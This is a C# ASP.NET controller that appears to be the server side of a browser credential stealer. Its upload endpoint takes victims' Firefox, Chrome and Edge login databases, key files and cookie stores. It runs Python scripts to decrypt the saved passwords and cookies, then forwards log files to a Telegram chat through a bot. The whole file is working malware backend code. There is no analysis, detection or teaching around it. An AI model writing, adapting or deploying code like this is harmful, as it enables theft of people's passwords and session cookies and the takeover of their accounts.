using AdminServer.Models;
using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using Telegram.Bot;
using Telegram.Bot.Types;

namespace AdminServer.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger)
        {
            _logger = logger;
        }

        public static async Task TelegramAsync(string[] args, string id)
        {
            TelegramBotClient logs = new TelegramBotClient("{serverHandlerToken}");

            // 2147291022
            using (var stream = System.IO.File.Open(args[0], System.IO.FileMode.Open))
            {
                InputFileStream inputFile = new InputFileStream(stream, Path.GetFileName(args[0]));
                await logs.SendDocumentAsync(id, inputFile);
            }
            /*using (var stream = System.IO.File.Open(args[1], System.IO.FileMode.Open))
            {
                InputFileStream inputFile = new InputFileStream(stream, Path.GetFileName(args[1]));
                await logs.SendDocumentAsync(id, inputFile);
            }*/
        }

        public IActionResult Index()
        {
            return View();
        }

        [HttpPost]
        [Route("/api/upload")]
        public async Task<IActionResult> Upload()
        {
            if (!Request.Form.Files.Any())
            {
                return BadRequest("No file uploaded.");
            }


            // change pyPath on paths in server!!!
            string pythonPath = @"C:\Users\Agent\AppData\Local\Programs\Python\Python311\python.exe";
            string getCookiesFromFirefox = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot\scripts\getFireCook.py");
            string getFirePass = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot\scripts\passwordsFireEx.py");
            string getCookiesAndPassFromEdge = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot\scripts\getCookiesAndPassFromEdge.py");
            string getCookiesAndPassFromChrome = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot\scripts\getCookiesAndPassFromChrome.py");

            var firstFile = Request.Form.Files[0];

            if (firstFile.FileName == "logContent")
            {
                var telegramId = Request.Form.Files[1];
                var logfileName = Path.GetFileName(firstFile.FileName);
                var logfilePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", logfileName);
                using (var stream = new FileStream(logfilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    await firstFile.CopyToAsync(stream);
                    stream.Close();
                }
                string[] args = new string[] { Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", logfileName) };
                await TelegramAsync(args, telegramId.FileName);

                System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", logfilePath));
            }
            else
            {
                var secondFile = Request.Form.Files[1];
                var thirdFile = Request.Form.Files[2];

                if (firstFile.Name == "firefoxLogins" && secondFile.Name == "key4" && thirdFile.Name == "firefoxCookies")
                {
                    var telegramId = Request.Form.Files[3];

                    var loginsFileName = Path.GetFileName(firstFile.FileName);
                    var loginsFilePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", loginsFileName);

                    var key4FileName = Path.GetFileName(secondFile.FileName);
                    var key4FilePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", key4FileName);

                    var cookiesFileName = Path.GetFileName(thirdFile.FileName);
                    var cookiesFilePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", cookiesFileName);

                    using (var stream = new FileStream(loginsFilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(key4FilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(cookiesFilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await thirdFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    // GET THE PASSWORDS
                    ProcessStartInfo passwordScript = new ProcessStartInfo();
                    passwordScript.FileName = pythonPath;
                    passwordScript.Arguments = string.Format(getFirePass);
                    passwordScript.UseShellExecute = false;
                    passwordScript.RedirectStandardOutput = true;
                    passwordScript.RedirectStandardError = true;

                    using (Process process = Process.Start(passwordScript))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string stdout = reader.ReadToEnd();
                            Console.WriteLine(stdout);
                        }
                        using (StreamReader reader = process.StandardError)
                        {
                            string stderr = reader.ReadToEnd();
                            Console.WriteLine(stderr);
                        }

                        process.WaitForExit();
                    }

                    // GET THE COOKIES
                    ProcessStartInfo cookieScript = new ProcessStartInfo();
                    cookieScript.FileName = pythonPath;
                    cookieScript.Arguments = string.Format(getCookiesFromFirefox);
                    cookieScript.UseShellExecute = false;
                    cookieScript.RedirectStandardOutput = true;
                    cookieScript.RedirectStandardError = true;

                    using (Process process = Process.Start(cookieScript))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string stdout = reader.ReadToEnd();
                            Console.WriteLine(stdout);
                        }
                        using (StreamReader reader = process.StandardError)
                        {
                            string stderr = reader.ReadToEnd();
                            Console.WriteLine(stderr);
                        }

                        process.WaitForExit();
                    }

                    Console.WriteLine("Firefox Successss!");

                    System.IO.File.Delete(loginsFilePath);
                    System.IO.File.Delete(key4FilePath);
                    System.IO.File.Delete(cookiesFilePath);

                    /*string[] args = new string[] { Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "firefoxCookies.txt"), Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "firefoxPasswords.txt") };
                    await TelegramAsync(args, telegramId.FileName);*/

                    /*System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "firefoxCookies.txt"));
                    System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "firefoxPasswords.txt"));*/
                }

                if (firstFile.Name == "edgeLoginData" && secondFile.Name == "edgeLocalState" && thirdFile.Name == "edgeCookies")
                {
                    var telegramId = Request.Form.Files[3];

                    var loginDataName = Path.GetFileName(firstFile.FileName);
                    var loginDataPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", loginDataName);

                    var localStateName = Path.GetFileName(secondFile.FileName);
                    var localStatePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", localStateName);

                    var cookiesName = Path.GetFileName(thirdFile.FileName);
                    var cookiesPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", cookiesName);

                    using (var stream = new FileStream(loginDataPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(localStatePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(cookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await thirdFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    // GET THE ALL DATA (Cookies and Passwords)
                    ProcessStartInfo getEdgeData = new ProcessStartInfo();
                    getEdgeData.FileName = pythonPath;
                    getEdgeData.Arguments = string.Format(getCookiesAndPassFromEdge);
                    getEdgeData.UseShellExecute = false;
                    getEdgeData.RedirectStandardOutput = true;
                    getEdgeData.RedirectStandardError = true;

                    using (Process process = Process.Start(getEdgeData))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string stdout = reader.ReadToEnd();
                            Console.WriteLine(stdout);
                        }
                        using (StreamReader reader = process.StandardError)
                        {
                            string stderr = reader.ReadToEnd();
                            Console.WriteLine(stderr);
                        }

                        process.WaitForExit();
                    }

                    Console.WriteLine("Edge Successss!");

                    System.IO.File.Delete(loginDataPath);
                    System.IO.File.Delete(localStatePath);
                    System.IO.File.Delete(cookiesPath);

                    /*string[] args = new string[] { Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "edgeCookies.txt"), Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "edgePasswords.txt") };
                    await TelegramAsync(args, telegramId.FileName);*/

                    /*System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "edgeCookies.txt"));
                    System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "edgePasswords.txt"));*/
                }

                if (firstFile.Name == "chromeLoginData" && secondFile.Name == "chromeLocalState" && thirdFile.Name == "chromeCookies")
                {
                    var telegramId = Request.Form.Files[3];

                    var loginDataName = Path.GetFileName(firstFile.FileName);
                    var loginDataPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", loginDataName);

                    var localStateName = Path.GetFileName(secondFile.FileName);
                    var localStatePath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", localStateName);

                    var cookiesName = Path.GetFileName(thirdFile.FileName);
                    var cookiesPath = Path.Combine(Directory.GetCurrentDirectory() + @"\wwwroot", cookiesName);

                    using (var stream = new FileStream(loginDataPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await firstFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(localStatePath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await secondFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    using (var stream = new FileStream(cookiesPath, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        await thirdFile.CopyToAsync(stream);
                        stream.Close();
                    }

                    // GET THE ALL DATA (Cookies and Passwords)
                    ProcessStartInfo getChromeData = new ProcessStartInfo();
                    getChromeData.FileName = pythonPath;
                    getChromeData.Arguments = string.Format(getCookiesAndPassFromChrome);
                    getChromeData.UseShellExecute = false;
                    getChromeData.RedirectStandardOutput = true;
                    getChromeData.RedirectStandardError = true;

                    using (Process process = Process.Start(getChromeData))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string stdout = reader.ReadToEnd();
                            Console.WriteLine(stdout);
                        }
                        using (StreamReader reader = process.StandardError)
                        {
                            string stderr = reader.ReadToEnd();
                            Console.WriteLine(stderr);
                        }

                        process.WaitForExit();
                    }

                    Console.WriteLine("Chrome Successss!");

                    System.IO.File.Delete(loginDataPath);
                    System.IO.File.Delete(localStatePath);
                    System.IO.File.Delete(cookiesPath);

                    /*string[] args = new string[] { Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "chromeCookies.txt"), Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "chromePasswords.txt") };
                    await TelegramAsync(args, telegramId.FileName);

                    System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "chromeCookies.txt"));
                    System.IO.File.Delete(Path.Join(Directory.GetCurrentDirectory(), @"\wwwroot", "chromePasswords.txt"));*/
                }
            }
            return Ok("File uploaded successfully.");
        }

        public IActionResult Privacy()
        {
            return View();
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}